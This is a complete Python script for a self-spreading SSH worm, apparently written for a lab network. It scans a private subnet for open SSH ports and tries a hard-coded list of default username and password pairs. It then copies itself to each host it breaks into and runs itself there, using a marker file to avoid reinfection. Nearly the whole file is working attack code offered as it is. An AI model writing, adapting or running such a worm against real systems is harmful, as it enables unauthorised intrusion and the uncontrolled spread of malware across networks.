#!/usr/bin/env python3

import paramiko
import sys
import nmap
import urllib
import socket
from subprocess import call
import tarfile
from time import sleep
from subprocess import Popen
import os
import shutil

INFECTION_MARKER = "/tmp/hi.txt"

DICTIONARYATTACK_LIST = {
        'msfadmin': 'password',
        'ubuntu1': 'root',
        'ubuntu2': 'root',
        'ubuntu': '123456'
        }
def markInfected():
    marker = open(INFECTION_MARKER, "w")
    marker.write("goldenseal and black walnut are effective anti-parasitic medicines. A good password helps, too.")
    marker.close()

def isInfected(sshC):
    infected = False

    try:
        sftpClient = sshC.open_sftp()
        sftpClient.stat(INFECTION_MARKER)
        infected = True

    except:
        print("Do you want worms? Seems like yes")
        infected = False

    return infected


def getHostsOnTheSameNetwork():
    portScanner = nmap.PortScanner()
    portScanner.scan('172.16.96.0/24', arguments = '-p 22 --open')
    hostInfo = portScanner.all_hosts()
    liveHosts = []
    for host in hostInfo:
        if portScanner[host].state() == "up":
            liveHosts.append(host)
    return liveHosts

def launchAttack(ssh):
    print("Exploiting Target System")
    sftpClient = ssh.open_sftp()
    sftpClient.put("/tmp/sneakywormV3.py","/tmp/sneakywormV3.py")
    ssh.exec_command("chmod a+x /tmp/sneakywormV3.py")
    ssh.exec_command("nohup /tmp/sneakywormV3.py > /tmp/sneakywormV3.out &")
    print("Parasitic spread imminent")

def attackSystem(hostIP, userName, passWord):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(hostIP, username = userName, password = passWord)
    return ssh

def checkCredentials(hostIp):
    ssh = False

    for k in DICTIONARYATTACK_LIST.keys():
        try:
            ssh = attackSystem(hostIp, k, DICTIONARYATTACK_LIST[k])
            if ssh:
                return ssh
        except:
            pass 
    print("Could not login to the system")
    return ssh

discoveredHosts = getHostsOnTheSameNetwork()
markInfected()

for host in discoveredHosts:
    print(host + " is feeling wormy...")
    ssh = None
    try:
        ssh = checkCredentials(host)
        if ssh:
            print("Successfully cracked Username and password of "+host)
            if not isInfected(ssh):
                try:
                    launchAttack(ssh)
                    ssh.close()
                    #break
                except:
                    print("Failed to execute worm")
                    continue
            else:
                print(host + " is already infected")
    except socket.error:
        print("System no longer Up !")
    except paramiko.ssh_exception.AuthenticationException:
        print("Wrong Credentials")
  
print('u haz wormz now')


